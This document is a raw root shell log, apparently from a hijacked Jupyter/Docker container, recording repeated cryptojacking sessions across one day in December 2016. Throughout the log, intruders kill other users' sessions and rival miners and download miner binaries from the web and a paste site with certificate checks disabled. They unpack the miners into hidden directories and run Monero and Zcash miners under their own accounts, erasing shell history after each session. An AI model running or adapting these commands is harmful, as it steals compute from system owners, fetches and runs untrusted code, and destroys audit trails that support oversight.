+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+kill -9 2233;  ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+kill -9 1686;  ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161231 02:02 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 02:21 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 02:21 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 02:21 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 02:21 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 02:21 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 02:56 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 03:31 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 04:06 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 04:06 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:06 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+kill -9 2696;  ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+kill -9 2485;  ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:07 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161231 04:08 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 04:51 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 04:51 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 04:51 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 04:51 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 04:51 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /notebooks
+ls ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /notebooks
+cd /opt ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /notebooks -> /opt
+ls ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /opt
+cd ~ ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /opt -> /root
+cd /tmp ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /root -> /tmp
+ls ### root@f5e57551b879 /dev/pts/1 20161231 05:38 /tmp
+c /opt/.z ### root@f5e57551b879 /dev/pts/1 20161231 05:40 /tmp
+cd /opt/.z ### root@f5e57551b879 /dev/pts/1 20161231 05:40 /tmp -> /opt/.z
+ls ### root@f5e57551b879 /dev/pts/1 20161231 05:40 /opt/.z
+cd nheqminer/nheqminer/build ### root@f5e57551b879 /dev/pts/1 20161231 05:40 /opt/.z -> /opt/.z/nheqminer/nheqminer/build
+ls ### root@f5e57551b879 /dev/pts/1 20161231 05:40 /opt/.z/nheqminer/nheqminer/build
+./nheqminer -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/1 20161231 05:48 /opt/.z/nheqminer/nheqminer/build
+ps -ae ### root@f5e57551b879 /dev/pts/1 20161231 05:48 /opt/.z/nheqminer/nheqminer/build
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /root -> /root/.ttmp
+./nheqminer -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/1 20161231 06:05 /opt/.z/nheqminer/nheqminer/build
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:05 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161231 06:06 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/1 20161231 06:12 /opt/.z/nheqminer/nheqminer/build
+pkill miner ### root@f5e57551b879 /dev/pts/1 20161231 06:12 /opt/.z/nheqminer/nheqminer/build
+pkill sh ### root@f5e57551b879 /dev/pts/1 20161231 06:12 /opt/.z/nheqminer/nheqminer/build
+ps -ae ### root@f5e57551b879 /dev/pts/1 20161231 06:12 /opt/.z/nheqminer/nheqminer/build
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 06:36 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 06:36 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 06:36 /root
+./nheqminer -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/1 20161231 06:36 /opt/.z/nheqminer/nheqminer/build
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 06:36 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 06:36 /root/.deb/opt/minergate-cli
+ps -ae ### root@f5e57551b879 /dev/pts/1 20161231 06:37 /opt/.z/nheqminer/nheqminer/build
+pkill miner ### root@f5e57551b879 /dev/pts/1 20161231 06:37 /opt/.z/nheqminer/nheqminer/build
+pkill sudo ### root@f5e57551b879 /dev/pts/1 20161231 06:37 /opt/.z/nheqminer/nheqminer/build
+pkill miner ### root@f5e57551b879 /dev/pts/1 20161231 06:37 /opt/.z/nheqminer/nheqminer/build
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 07:08 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 07:08 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 07:08 /root
+./nheqminer -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/1 20161231 07:08 /opt/.z/nheqminer/nheqminer/build
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 07:08 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 07:08 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+kill -9 3653;  ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+kill -9 3462;  ### root@f5e57551b879 /dev/pts/2 20161231 08:17 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161231 08:18 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 08:22 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 08:22 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 08:22 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 08:23 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 08:23 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 09:22 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 09:53 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 10:24 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 10:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 10:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:26 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+kill -9 4190;  ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+kill -9 3897;  ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:27 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161231 10:28 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 10:55 /notebooks
